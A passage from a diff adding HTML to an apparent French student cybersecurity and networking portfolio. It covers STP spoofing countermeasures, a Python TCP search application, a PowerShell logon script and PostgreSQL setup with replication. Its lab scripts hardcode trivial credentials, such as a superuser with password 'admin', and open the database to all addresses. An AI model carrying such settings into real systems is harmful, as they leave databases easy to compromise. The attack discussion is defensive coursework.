+                <p>
+                    Conséquences : tout le trafic inter-VLANs transite désormais par SW-A, qui
+                    peut l'intercepter (Man-in-the-Middle L2). La reconvergence STP lors de
+                    l'élection provoque un déni de service de plusieurs secondes sur tous les
+                    VLANs. Un attaquant physiquement présent dans les locaux peut ainsi
+                    compromettre l'ensemble des communications sans toucher aux équipements
+                    d'administration.
+                </p>
+
+                <p><strong>2. Contre-mesures : BPDU Guard, PortFast et priorité fixe</strong></p>
+                <pre><code>! BPDU Guard sur tous les ports d'accès (non trunk)
+SR2(config)# interface range GigabitEthernet1/0/2-5
+SR2(config-if)# spanning-tree portfast
+SR2(config-if)# spanning-tree bpduguard enable
+! → Port mis en err-disabled si un BPDU est reçu
+
+! Priorité STP fixe et élevée pour SR2 (garantit qu'il reste Root Bridge légitime)
+SR2(config)# spanning-tree vlan 1,10,20,30 priority 4096</code></pre>
+                <p>
+                    <code>spanning-tree portfast</code> active immédiatement les ports d'accès
+                    (postes clients) sans passer par les états Listening et Learning, éliminant
+                    le délai de 30 secondes au démarrage. <code>spanning-tree bpduguard enable</code>
+                    place le port en état <code>err-disabled</code> dès réception d'un BPDU :
+                    aucun switch non autorisé ne peut envoyer de BPDUs sur un port d'accès sans
+                    être immédiatement bloqué. La priorité 4096 sur SR2 garantit qu'aucun switch
+                    avec la priorité par défaut (32768) ne peut le détrôner comme Root Bridge.
+                </p>
+
+                <p><strong>3. Autres types d'attaques réseau étudiés dans ce contexte</strong></p>
+                <p>
+                    <em>VLAN hopping :</em> un attaquant dans un VLAN tente d'atteindre un autre
+                    VLAN en exploitant le protocole 802.1Q. Contre-mesure : désactiver le mode
+                    trunk automatique (<code>switchport nonegotiate</code>), forcer le mode access
+                    sur tous les ports d'accès et définir un VLAN natif inutilisé.
+                </p>
+                <p>
+                    <em>Attaque par déni de service sur OSPF :</em> injection de faux LSAs pour
+                    perturber les tables de routage. Contre-mesure dans notre infrastructure :
+                    OSPF est exempté des ACLs (<code>permit ospf any any</code>) mais les
+                    interfaces OSPF sont limitées aux équipements de confiance par le filtrage
+                    des réseaux déclarés dans chaque processus OSPF.
+                </p>
+                <p>
+                    <em>Interception de flux non chiffrés :</em> sans le tunnel IPSec, tout le
+                    trafic inter-sites sur le réseau de transit R2 serait lisible en clair.
+                    C'est précisément pour contrer ce risque que GRE over IPSec (AES-256,
+                    SHA-256) a été choisi pour l'interconnexion inter-sites.
+                </p>
+            </div>
+        </details>
+
+        <!-- AC24.06Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC24.06Cyber | Comprendre des documents techniques en anglais
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.02 – Développer des applications
+                    communicantes</strong>, j'ai démontré ma capacité à comprendre et à produire
+                    des documents techniques en anglais tout au long du développement de
+                    l'application client/serveur de recherche documentaire.
+                </p>
+
+                <p><strong>1. Code source entièrement en anglais avec PEP 8</strong></p>
+                <p>
+                    L'intégralité du code des trois modules a été rédigée en anglais. Dans le
+                    domaine du développement logiciel professionnel, l'anglais est la langue
+                    universelle : les bibliothèques, les documentations, Stack Overflow, GitHub
+                    et les CVEs sont tous en anglais. Voici des exemples des conventions
+                    appliquées :
+                </p>
+                <pre><code># Constantes en UPPER_CASE
+SERVER_HOST = "127.0.0.1"
+SERVER_PORT = 52300
+NET_BUFFER = 16384
+ENCODING_TYPE = "utf-8"
+DISCONNECT_SIGNAL = "q"
+MAX_LISTEN = 5
+
+# Classe en CamelCase
+class ClientWorker(threading.Thread):
+    """Thread handling a single client connection."""
+    def __init__(self, conn, addr):
+        super().__init__(daemon=True)
+        self.conn = conn
+        self.addr = addr
+
+# Fonctions en snake_case avec docstrings
+def execute_search(query1, query2, mode, extensions):
+    """
+    Search for terms in all supported files.
+    Args:
+        query1 (str): Primary search term.
+        query2 (str): Secondary term (AND/OR modes).
+        mode (str): 'simple', 'and', 'or', or 'regex'.
+        extensions (list): File types to search, e.g. ['.pdf', '.txt'].
+    Returns:
+        list: Search results as dicts with keys 'file', 'location', 'context'.
+    """</code></pre>
+
+                <p><strong>2. Documentation README.md entièrement en anglais</strong></p>
+                <p>
+                    Le fichier README.md décrit le projet "Pentesting Document Search System"
+                    avec les sections standards d'un projet open source anglophone : Overview
+                    (description fonctionnelle), Features (liste des fonctionnalités), Project
+                    Structure (arborescence des fichiers), Requirements (Python 3.8+, tkinter,
+                    pip install …), Installation (commandes pas à pas), Usage (comment lancer
+                    le serveur puis le client), Search Modes (description des quatre modes avec
+                    exemples), et un exemple de recherche Regex avancée :
+                </p>
+                <pre><code># Example: Find certifications in documents
+Pattern: \b(CEH|OSCP|PNPT|eJPT)\b
+Mode: Regex
+Files: .txt, .pdf
+# Matches: "CEH certification", "OSCP exam", etc.</code></pre>
+
+                <p><strong>3. Consultation des documentations officielles anglaises</strong></p>
+                <p>
+                    Pour développer l'application, j'ai lu et compris les documentations
+                    officielles en anglais de quatre bibliothèques Python :
+                </p>
+                <p>
+                    <strong>PyPDF2 (docs.pypdf.io) :</strong> J'ai lu la documentation de la
+                    classe <code>PdfReader</code>, appris à itérer sur <code>reader.pages</code>
+                    et à utiliser la méthode <code>page.extract_text()</code>. J'ai également
+                    compris les limitations : extract_text() fonctionne uniquement avec les
+                    PDFs contenant du texte réel (polices embarquées) et non avec des PDFs
+                    numérisés (images), qui nécessiteraient un OCR (pytesseract).
+                </p>
+                <p>
+                    <strong>openpyxl (openpyxl.readthedocs.io) :</strong> Documentation
+                    de la fonction <code>load_workbook(filename, data_only=True)</code>,
+                    du parcours des feuilles via <code>book.sheetnames</code> et
+                    <code>book[sheet_name]</code>, et de l'itération sur les cellules avec
+                    <code>sheet.iter_rows(values_only=True)</code> qui retourne les valeurs
+                    calculées (non les formules Excel) sous forme de tuples Python.
+                </p>
+                <p>
+                    <strong>BeautifulSoup (beautiful-soup-4.readthedocs.io) :</strong>
+                    Documentation de <code>BeautifulSoup(html_content, 'html.parser')</code>
+                    et de la méthode <code>.get_text()</code> qui extrait uniquement le
+                    texte visible, en supprimant toutes les balises HTML, attributs, scripts
+                    JavaScript et feuilles de style CSS.
+                </p>
+                <p>
+                    <strong>Python socket (docs.python.org/3/library/socket) :</strong>
+                    Documentation des constantes <code>AF_INET</code> (famille d'adresse IPv4),
+                    <code>SOCK_STREAM</code> (protocole TCP orienté connexion),
+                    <code>SOL_SOCKET</code>/<code>SO_REUSEADDR</code> (option permettant la
+                    réutilisation immédiate du port), <code>SHUT_RDWR</code> (fermeture
+                    bidirectionnelle propre du socket).
+                </p>
+            </div>
+        </details>
+
+    </div>
+</details>
+
+<!-- ============================================================ -->
+<!-- PROGRAMMER                                                    -->
+<!-- ============================================================ -->
+<details class="accordion-item">
+    <summary class="accordion-title">Programmer</summary>
+    <div class="accordion-content">
+
+        <!-- AC23.01 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC23.01 | Automatiser l'administration système avec des scripts
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.Cyber.03 – Concevoir un réseau informatique
+                    sécurisé multi-sites</strong>, j'ai développé deux scripts d'automatisation
+                    couvrant des besoins d'administration système distincts : un script PowerShell
+                    pour l'automatisation côté Windows et un script Bash pour l'initialisation
+                    de la base de données PostgreSQL dans Docker.
+                </p>
+
+                <p><strong>1. Script PowerShell de logon – montage automatique du partage réseau</strong></p>
+                <p>
+                    Ce script est déployé via la GPO <code>Logon_mount_Partage_Personnel</code>
+                    liée à l'OU contenant le groupe <em>20_Personnel</em>. Il s'exécute
+                    automatiquement à chaque ouverture de session de tout utilisateur appartenant
+                    à ce groupe :
+                </p>
+                <pre><code># Script : mount_partage_personnel.ps1
+# Description : Monter automatiquement le partage Personnel au logon
+
+$sharePath = "\\192.168.10.10\Partage_Personnel"
+$driveLetter = "Z:"
+
+# Vérifier si le lecteur est déjà monté
+if (-not (Test-Path $driveLetter)) {
+    net use $driveLetter $sharePath /persistent:yes
+    if ($LASTEXITCODE -ne 0) {
+        Write-EventLog -LogName Application `
+                       -Source "Logon Script" `
+                       -EventId 1001 `
+                       -EntryType Error `
+                       -Message "Echec montage $sharePath"
+        Write-Output "Erreur : impossible de monter $sharePath"
+    } else {
+        Write-Output "Partage $sharePath monté en $driveLetter"
+    }
+} else {
+    Write-Output "Lecteur $driveLetter déjà monté."
+}</code></pre>
+                <p>
+                    <code>net use</code> est la commande Windows pour gérer les connexions aux
+                    ressources réseau partagées (équivalent Windows de <code>mount</code> sous
+                    Linux). <code>/persistent:yes</code> demande à Windows de mémoriser la connexion
+                    et de la rétablir automatiquement au prochain démarrage. <code>Test-Path</code>
+                    vérifie si le chemin existe avant de tenter le montage, évitant une erreur
+                    si le lecteur était déjà monté (double logon, reconnexion après veille).
+                    <code>$LASTEXITCODE</code> contient le code de retour de la dernière commande
+                    externe (0 = succès, non-0 = erreur). <code>Write-EventLog</code> écrit
+                    l'erreur dans le journal des événements Windows, facilitant le diagnostic.
+                </p>
+                <p>
+                    Pour que ce script s'exécute, deux GPOs complémentaires sont nécessaires :
+                    la GPO <code>PowerShell_ExecutionPolicy</code> passe la politique d'exécution
+                    de <em>Restricted</em> (aucun script) à <em>RemoteSigned</em> (les scripts
+                    locaux s'exécutent, les distants nécessitent une signature), et la GPO de
+                    logon référence le chemin UNC du script stocké sur le SYSVOL du contrôleur
+                    de domaine (<code>\\societetemaqam.pepiniere.rt\SYSVOL\...\scripts\</code>).
+                </p>
+
+                <p><strong>2. Script Bash d'initialisation PostgreSQL (init_prod.sh)</strong></p>
+                <p>
+                    Ce script est copié dans l'image Docker PostgreSQL via le Dockerfile et
+                    s'exécute automatiquement au premier démarrage du conteneur. Il automatise
+                    intégralement la création du schéma de base de données :
+                </p>
+                <pre><code>#!/bin/bash
+# init_prod.sh : initialisation PostgreSQL pour la SAE 3.Cyber.03
+set -e   # Stopper immédiatement sur toute erreur
+
+DB_NAME="sae24"
+ADMIN_USER="prod_admin"
+ADMIN_PASS="prod_admin_pass"
+REPL_USER="rep_user"
+REPL_PASS="rep_secure_pass"
+
+echo "==> Création utilisateur administrateur applicatif"
+psql -v ON_ERROR_STOP=1 --username "$POSTGRES_USER" <<-EOSQL
+    CREATE USER $ADMIN_USER WITH ENCRYPTED PASSWORD '$ADMIN_PASS';
+    CREATE DATABASE $DB_NAME OWNER $ADMIN_USER;
+    GRANT ALL PRIVILEGES ON DATABASE $DB_NAME TO $ADMIN_USER;
+EOSQL
+
+echo "==> Création utilisateur de réplication"
+psql -v ON_ERROR_STOP=1 --username "$POSTGRES_USER" <<-EOSQL
+    CREATE USER $REPL_USER REPLICATION LOGIN ENCRYPTED PASSWORD '$REPL_PASS';
+EOSQL
+
+echo "==> Création du schéma de données"
+psql -v ON_ERROR_STOP=1 --username "$ADMIN_USER" --dbname "$DB_NAME" <<-EOSQL
+    CREATE TABLE users (
+        id       SERIAL PRIMARY KEY,
+        username VARCHAR(100) UNIQUE NOT NULL,
+        password VARCHAR(255) NOT NULL
+    );
+    CREATE TABLE product (
+        id             SERIAL PRIMARY KEY,
+        name           VARCHAR(100) NOT NULL,
+        description    TEXT,
+        description_en TEXT DEFAULT '',
+        price          FLOAT NOT NULL,
+        image_url      TEXT
+    );
+    CREATE TABLE cart_item (
+        id         SERIAL PRIMARY KEY,
+        user_id    INTEGER REFERENCES users(id)   ON DELETE CASCADE,
+        product_id INTEGER REFERENCES product(id) ON DELETE CASCADE,
+        quantity   INTEGER DEFAULT 1 NOT NULL
+    );
+EOSQL
+echo "==> Initialisation terminée avec succès"</code></pre>
+                <p>
+                    <code>set -e</code> (errexit) est une option bash essentielle pour les
+                    scripts d'initialisation : si une commande retourne un code d'erreur non-nul,
+                    le script s'arrête immédiatement plutôt que de continuer vers une initialisation
+                    partielle incohérente. <code>psql -v ON_ERROR_STOP=1</code> transmet ce
+                    comportement aux instructions SQL exécutées via psql : une erreur SQL stoppe
+                    également l'exécution. <code>ON DELETE CASCADE</code> sur les clés étrangères
+                    garantit que la suppression d'un utilisateur entraîne automatiquement la
+                    suppression de ses éléments de panier, maintenant l'intégrité référentielle.
+                </p>
+            </div>
+        </details>
+
+        <!-- AC23.02 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC23.02 | Développer une application à partir d'un cahier des charges donné
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.02 – Développer des applications
+                    communicantes</strong>, j'ai développé une application client/serveur
+                    complète de recherche documentaire en Python en respectant strictement
+                    un cahier des charges définissant les fonctionnalités, l'architecture,
+                    le protocole réseau, le style de code et la documentation.
+                </p>
+
+                <p><strong>1. Architecture modulaire en trois composants</strong></p>
+                <p>
+                    Le cahier des charges imposait une séparation claire des responsabilités.
+                    J'ai découpé le projet en trois modules Python indépendants :
+                </p>
+                <pre><code>sae302/
+├── serveur.py       # Serveur TCP, gestion des connexions, multithreading
+├── client.py        # Interface graphique Tkinter, communication réseau
+├── recherche.py     # Moteur de recherche multi-format (aucune dépendance réseau/GUI)
+├── requirements.txt # Dépendances Python du projet
+├── data/            # Répertoire des fichiers à indexer
+│   ├── pentesting.pdf
+│   ├── pentesting.xlsx
+│   ├── pentesting.txt
+│   └── pentesting.html
+└── README.md        # Documentation en anglais</code></pre>
+                <p>
+                    Le fichier <code>requirements.txt</code> liste toutes les dépendances
+                    nécessaires à l'exécution du projet, permettant à n'importe quel utilisateur
+                    d'installer l'environnement en une seule commande
+                    (<code>pip install -r requirements.txt</code>) :
+                </p>
+                <pre><code>PyPDF2
+openpyxl
+beautifulsoup4</code></pre>
+                <p>
+                    <code>tkinter</code> n'est pas inclus dans le requirements.txt car il fait
+                    partie de la bibliothèque standard Python (livré avec l'interpréteur).
+                    Cette architecture respecte le principe SOLID (Single Responsibility
+                    Principle) : <code>recherche.py</code> peut être testé et importé
+                    indépendamment, sans démarrer le serveur réseau ni l'interface graphique.
+                </p>
+
+                <p><strong>2. Moteur de recherche multi-format et multi-mode</strong></p>
+                <p>
+                    La fonction principale du moteur de recherche gère quatre extensions et
+                    quatre modes logiques. Voici un extrait représentatif de la structure du
+                    code pour la recherche dans les fichiers Excel :
+                </p>
+                <pre><code>import openpyxl
+from functools import lru_cache
+
+def search_xlsx(filepath, query1, query2, mode):
+    """Search for terms in an Excel workbook."""
+    results = []
+    book = openpyxl.load_workbook(filepath, data_only=True)
+    for sheet_name in book.sheetnames:
+        sheet = book[sheet_name]
+        for row_idx, row in enumerate(sheet.iter_rows(values_only=True), start=1):
+            for col_idx, cell_value in enumerate(row, start=1):
+                if cell_value is None:
+                    continue
+                cell_text = str(cell_value)
+                if match_logic(cell_text, query1, query2, mode):
+                    results.append({
+                        "file": filepath,
+                        "location": f"Sheet '{sheet_name}', "
+                                    f"Row {row_idx}, Col {col_idx}",
+                        "context": cell_text[:120]
+                    })
+    return results</code></pre>
+                <p>
+                    <code>data_only=True</code> retourne les valeurs calculées plutôt que les
+                    formules Excel. <code>iter_rows(values_only=True)</code> retourne des tuples
+                    Python (plus performant que l'accès cellule par cellule via
+                    <code>cell(row, col)</code>). <code>str(cell_value)</code> gère le cas des
+                    cellules numériques (entiers, flottants, dates) qui ne peuvent pas être
+                    comparées directement à des chaînes de recherche.
+                </p>
+
+                <p><strong>3. Interface graphique Tkinter complète</strong></p>
+                <p>
+                    L'interface client est développée en orienté objet avec la classe
+                    <code>SearchInterface</code>. Voici la structure des widgets principaux :
+                </p>
+                <pre><code>class SearchInterface:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Document Search Client")
+        self.root.configure(bg="#1e1e1e")  # Thème sombre
+        self.client_socket = None
+        self.connected = False
+        self._build_connection_bar()
+        self._build_search_panel()
+        self._build_results_area()
+
+    def _build_connection_bar(self):
+        frame = tk.Frame(self.root, bg="#1e1e1e")
+        self.host_entry = tk.Entry(frame, width=15)
+        self.host_entry.insert(0, "127.0.0.1")
+        self.port_entry = tk.Entry(frame, width=6)
+        self.port_entry.insert(0, "52300")
+        self.connect_btn = tk.Button(frame, text="Connect",
+                                      command=self.connect_to_server)
+        self.status_label = tk.Label(frame, text="Offline",
+                                      fg="red", bg="#1e1e1e")
+
+    def _build_results_area(self):
+        self.results_text = scrolledtext.ScrolledText(
+            self.root, bg="#252526", fg="#cccccc",
+            font=("Consolas", 11), insertbackground="white"
+        )
+        # Tag pour colorer les en-têtes de résultats
+        self.results_text.tag_configure(
+            "header", foreground="#569cd6", font=("Consolas", 11, "bold")
+        )</code></pre>
+
+                <p><strong>4. Gestion des états de l'interface (UX)</strong></p>
+                <p>
+                    Les boutons et champs de l'interface sont activés/désactivés dynamiquement
+                    selon l'état de connexion, empêchant toute interaction incohérente :
+                </p>
+                <pre><code>def connect_to_server(self):
+    try:
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client_socket.connect((self.host_entry.get(),
+                                    int(self.port_entry.get())))
+        # Attendre le message READY du serveur
+        ready = self.client_socket.recv(NET_BUFFER).decode(ENCODING_TYPE)
+        if "READY" in ready:
+            self.connected = True
+            self.status_label.config(text="Online", fg="green")
+            self.search_btn.config(state=tk.NORMAL)
+            self.disconnect_btn.config(state=tk.NORMAL)
+            self.connect_btn.config(state=tk.DISABLED)
+    except (ConnectionRefusedError, ValueError) as e:
+        messagebox.showerror("Connection Error", str(e))</code></pre>
+            </div>
+        </details>
+
+        <!-- AC23.03 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC23.03 | Utiliser un protocole réseau pour programmer une application client/serveur
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.02 – Développer des applications
+                    communicantes</strong>, j'ai implémenté une architecture client/serveur TCP
+                    complète en Python, en gérant tous les aspects bas niveau du protocole réseau.
+                </p>
+
+                <p><strong>1. Serveur TCP multithreadé</strong></p>
+                <pre><code>import socket
+import threading
+import json
+
+SERVER_HOST = "127.0.0.1"
+SERVER_PORT = 52300
+MAX_LISTEN  = 5
+NET_BUFFER  = 16384      # 16 Ko
+ENCODING    = "utf-8"
+DISCONNECT  = "q"
+
+def run_server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # SO_REUSEADDR : évite l'erreur "Address already in use" au redémarrage
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind((SERVER_HOST, SERVER_PORT))
+    server_socket.listen(MAX_LISTEN)
+    print(f"[SERVER] Listening on {SERVER_HOST}:{SERVER_PORT}")
+
+    # Thread de monitoring clavier (q pour quitter)
+    monitor = threading.Thread(target=input_monitor, daemon=True)
+    monitor.start()
+
+    while True:
+        conn, addr = server_socket.accept()
+        print(f"[+] New connection from {addr}")
+        ClientWorker(conn, addr).start()
+
+def input_monitor():
+    while True:
+        if input().strip().lower() == DISCONNECT:
+            print("[SERVER] Shutting down.")
+            os._exit(0)</code></pre>
+                <p>
+                    <code>AF_INET</code> désigne la famille d'adresses IPv4. <code>SOCK_STREAM</code>
+                    spécifie TCP (orienté connexion, fiable, ordonné). <code>SO_REUSEADDR</code>
+                    est une option socket au niveau <code>SOL_SOCKET</code> : sans elle, si le
+                    serveur redémarre rapidement après une fermeture, le port reste en état
+                    TIME_WAIT pendant 2×MSL (Maximum Segment Lifetime, soit ~60 secondes) et
+                    le bind échoue. <code>listen(MAX_LISTEN)</code> définit la taille de la
+                    file d'attente des connexions TCP en cours d'établissement.
+                </p>
+
+                <p><strong>2. Thread ClientWorker (traitement concurrent)</strong></p>
+                <pre><code>class ClientWorker(threading.Thread):
+    def __init__(self, conn, addr):
+        super().__init__(daemon=True)
+        self.conn = conn
+        self.addr = addr
+
+    def run(self):
+        try:
+            # Signaler au client que la connexion est établie
+            self.conn.sendall("READY".encode(ENCODING))
+
+            while True:
+                raw = self.conn.recv(NET_BUFFER)
+                if not raw:
+                    break  # Déconnexion brutale du client
+                message = raw.decode(ENCODING).strip()
+                if message == DISCONNECT:
+                    break
+
+                # Désérialisation de la requête JSON
+                request = json.loads(message)
+                results = execute_search(
+                    request.get("query1", ""),
+                    request.get("query2", ""),
+                    request.get("mode", "simple"),
+                    request.get("extensions", [".txt",".pdf",".xlsx",".html"])
+                )
+                # Sérialisation et envoi de la réponse
+                response = json.dumps(results, ensure_ascii=False)
+                self.conn.sendall(response.encode(ENCODING))
+
+        except (ConnectionResetError, BrokenPipeError) as e:
+            print(f"[-] Client {self.addr} disconnected: {e}")
+        finally:
+            self.conn.close()
+            print(f"[-] Connection with {self.addr} closed.")</code></pre>
+                <p>
+                    <code>daemon=True</code> est essentiel : un thread daemon se termine
+                    automatiquement lorsque le programme principal se termine, évitant que
+                    des threads clients orphelins empêchent la fermeture propre du serveur.
+                    <code>sendall()</code> est préféré à <code>send()</code> car il garantit
+                    l'envoi complet des données même si le noyau fragmente l'envoi en plusieurs
+                    segments TCP. <code>ConnectionResetError</code> et <code>BrokenPipeError</code>
+                    couvrent les cas de déconnexion brutale (coupure réseau, kill du client).
+                </p>
+
+                <p><strong>3. Réception en boucle côté client (assemblage des chunks)</strong></p>
+                <pre><code>def receive_full_response(sock):
+    """Receive all chunks until end of transmission."""
+    full_data = b""
+    while True:
+        chunk = sock.recv(NET_BUFFER)
+        if not chunk:
+            break  # Socket fermé
+        full_data += chunk
+        if len(chunk) < NET_BUFFER:
+            break  # Dernier chunk (taille < buffer = fin de transmission)
+    return full_data.decode(ENCODING)</code></pre>
+                <p>
+                    TCP est un protocole de flux : il ne préserve pas les frontières de messages.
+                    Un seul appel à <code>send()</code> côté serveur peut nécessiter plusieurs
+                    appels à <code>recv()</code> côté client si les données dépassent la taille
+                    du buffer réseau ou si la pile TCP décide de segmenter. La détection de fin
+                    de message utilise le fait qu'un chunk de taille inférieure au buffer
+                    (<code>len(chunk) < NET_BUFFER</code>) signale généralement la fin des
+                    données disponibles. Pour des protocoles plus robustes, on utiliserait
+                    des délimiteurs (<code>\n</code>) ou un en-tête de longueur.
+                </p>
+
+                <p><strong>4. Format d'échange JSON</strong></p>
+                <p>
+                    Toutes les requêtes et réponses sont sérialisées en JSON, un format texte
+                    universel et facilement débuggable. Exemples de structures :
+                </p>
+                <pre><code># Requête mode simple
+{"query1": "nmap", "query2": "", "mode": "simple",
+ "extensions": [".txt", ".pdf"]}
+
+# Requête mode regex
+{"query1": "\\b(CVE-\\d{4}-\\d+)\\b", "query2": "",
+ "mode": "regex", "extensions": [".txt", ".html", ".pdf"]}
+
+# Réponse du serveur
+[
+  {"file": "data/pentest_report.pdf",
+   "location": "Page 3, Line 12",
+   "context": "nmap scan revealed open ports 22, 80 and 443 on target..."},
+  {"file": "data/notes.txt",
+   "location": "Line 47",
+   "context": "nmap -sV -O 192.168.1.1 results:"}
+]</code></pre>
+            </div>
+        </details>
+
+        <!-- AC23.04 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC23.04 | Installer, administrer un système de gestion de données
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.02 – Développer des applications
+                    communicantes</strong>, j'ai installé, configuré et administré un serveur
+                    <strong>PostgreSQL 14</strong> sur machine Linux, comprenant la création
+                    du schéma de données, la gestion des rôles et des droits, et la mise en
+                    place d'une réplication en streaming vers une machine secondaire.
+                </p>
+
+                <p><strong>1. Installation et configuration initiale</strong></p>
+                <pre><code>apt update
+apt install postgresql postgresql-client
+systemctl status postgresql
+
+# Autoriser les connexions réseau
+# Dans /etc/postgresql/14/main/postgresql.conf :
+listen_addresses = '*'</code></pre>
+
+                <p><strong>2. Création de la base, du schéma et des rôles</strong></p>
+                <pre><code>-- Création de la base de données
+CREATE DATABASE société_62;
+\c société_62
+
+-- Création du schéma métier
+CREATE SCHEMA production;
+
+-- Rôles applicatifs
+CREATE ROLE prod_rw    WITH LOGIN PASSWORD 'prod';
+CREATE ROLE replicat   WITH REPLICATION LOGIN PASSWORD 'replicat';
+CREATE ROLE prod_admin WITH LOGIN PASSWORD 'admin' SUPERUSER;
+CREATE ROLE web_read   WITH LOGIN PASSWORD 'web';</code></pre>
+                <p>
+                    Trois niveaux d'accès distincts respectent le principe du moindre privilège :
+                    <code>prod_rw</code> (lecture/écriture applicative), <code>web_read</code>
+                    (lecture seule pour le front-end web), <code>replicat</code> (réplication
+                    uniquement, droit <code>REPLICATION</code>) et <code>prod_admin</code>
+                    (superutilisateur pour l'administration DBA).
+                </p>
+
+                <p><strong>3. Schéma de données — tables du schéma production</strong></p>
+                <pre><code>CREATE TABLE production.clients (
+    id_client  SERIAL PRIMARY KEY,
+    nom        VARCHAR(100),
+    prenom     VARCHAR(100),
+    date_anniv DATE
+);
+
+CREATE TABLE production.produits (
+    id_produit SERIAL PRIMARY KEY,
+    nom        VARCHAR(100),
+    prix       INT,
+    stock      INT
+);
+
+CREATE TABLE production.employe (
+    id_employe SERIAL PRIMARY KEY,
+    nom        VARCHAR(100),
+    prenom     VARCHAR(100),
+    date_anniv DATE
+);</code></pre>
+
+                <p><strong>4. Attribution des droits sur le schéma</strong></p>
+                <pre><code>-- Droits pour prod_rw (lecture/écriture)
+GRANT CONNECT ON DATABASE société_62 TO prod_rw;
+GRANT USAGE ON SCHEMA production TO prod_rw;
+GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA production TO prod_rw;
+ALTER DEFAULT PRIVILEGES IN SCHEMA production
+    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO prod_rw;
+
+-- Droits pour web_read (lecture seule)
+GRANT CONNECT ON DATABASE société_62 TO web_read;
+GRANT USAGE ON SCHEMA production TO web_read;
+GRANT SELECT ON ALL TABLES IN SCHEMA production TO web_read;</code></pre>
+                <p>
+                    <code>ALTER DEFAULT PRIVILEGES</code> garantit que les futures tables créées
+                    dans le schéma <code>production</code> hériteront automatiquement des droits
+                    accordés à <code>prod_rw</code>, sans intervention manuelle à chaque nouvelle
+                    table. Le schéma <code>production</code> isole les tables métier des tables
+                    système du schéma <code>public</code>.
+                </p>
+
+                <p><strong>5. Authentification par mot de passe (md5)</strong></p>
+                <pre><code># Dans /etc/postgresql/14/main/pg_hba.conf
+# Avant :
+local   all   all   peer
+# Après :
+local   all   all   md5
+
+# Connexion avec les comptes applicatifs
+psql -U prod_rw  -d société_62   # accès lecture/écriture
+psql -U web_read -d société_62   # accès lecture seule (réplicat)</code></pre>
+
+                <p><strong>6. Réplication en streaming vers une machine secondaire</strong></p>
+                <p>
+                    Sur le serveur <strong>primaire</strong>, j'ai configuré PostgreSQL pour
+                    accepter les connexions de réplication :
+                </p>
+                <pre><code># /etc/postgresql/14/main/postgresql.conf
+listen_addresses = '*'
+wal_level        = replica
+max_wal_senders  = 3
+wal_keep_size    = 512MB
+
+# /etc/postgresql/14/main/pg_hba.conf — autoriser le réplicat
+host replication replicat IP_REPLICAT/MASQUE_REPLICAT md5</code></pre>
+                <p>
+                    <code>wal_level = replica</code> active l'écriture des Write-Ahead Logs
+                    nécessaires à la réplication. <code>max_wal_senders = 3</code> autorise
+                    jusqu'à 3 connexions de réplication simultanées. <code>wal_keep_size</code>
+                    conserve 512 Mo de WAL pour que le réplicat puisse rattraper un retard
+                    sans perdre de segments.
+                </p>
+                <p>
+                    Sur la machine <strong>réplicat</strong> :
+                </p>
+                <pre><code>apt update && apt install postgresql postgresql-client
+
+# Arrêter le service et vider la base vide initiale
+sudo systemctl stop postgresql
+sudo rm -rf /var/lib/postgresql/14/main/*
+
+# Cloner la base de production par streaming
+pg_basebackup -h 192.31.25.16 -D /var/lib/postgresql/14/main \
+              -U replicat -v -P --wal-method=stream
+
+# Créer le fichier signal de standby
+sudo -u postgres touch /var/lib/postgresql/14/main/standby.signal
+
+# Configurer la connexion vers le primaire
+# /etc/postgresql/14/main/postgresql.conf :
+primary_conninfo  = 'host=192.31.25.16 port=5432 user=replicat password=replicat'
+primary_slot_name = 'replicat_slot'
+
+# Redémarrer le cluster en mode standby
+sudo pg_ctlcluster 14 main restart
+
+# Vérifications
+sudo tail -n 50 /var/log/postgresql/postgresql-14-main.log
+sudo -u postgres psql -c "SELECT pg_is_in_recovery();"
+-- Retourne t = le réplicat est bien en mode recovery (lecture seule)</code></pre>
+                <p>
+                    Sur le serveur <strong>primaire</strong>, vérification que le réplicat
+                    est bien connecté et synchronisé :
+                </p>
+                <pre><code>SELECT client_addr, state FROM pg_stat_replication;
+-- client_addr = IP du réplicat, state = streaming = synchronisation active
+
+-- Navigation dans le schéma production
+SHOW search_path;
+SET search_path TO production;
+-- Permet d'accéder aux tables sans préfixer : SELECT * FROM clients;</code></pre>
+            </div>
+        </details>
+
+        <!-- AC23.05 -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC23.05 | Accéder à un ensemble de données depuis une application
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.02 – Développer des applications
+                    communicantes</strong>, j'ai développé dans le module <code>recherche.py</code>
+                    un moteur de recherche multi-format capable d'accéder à quatre types de
+                    sources de données hétérogènes, avec un cache LRU et une logique de
+                    correspondance unifiée.
+                </p>
+
+                <p><strong>1. Accès aux fichiers TXT avec cache LRU</strong></p>
+                <pre><code>from functools import lru_cache
+
+@lru_cache(maxsize=128)
+def get_file_lines(filepath):
+    """Read a text file and return its lines as a tuple (hashable for cache)."""
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            return tuple(f.readlines())
+    except (OSError, IOError) as e:
+        print(f"[ERROR] Cannot read {filepath}: {e}")
+        return tuple()
+
+def search_txt(filepath, query1, query2, mode):
+    lines = get_file_lines(filepath)
+    results = []
+    for line_num, line in enumerate(lines, start=1):
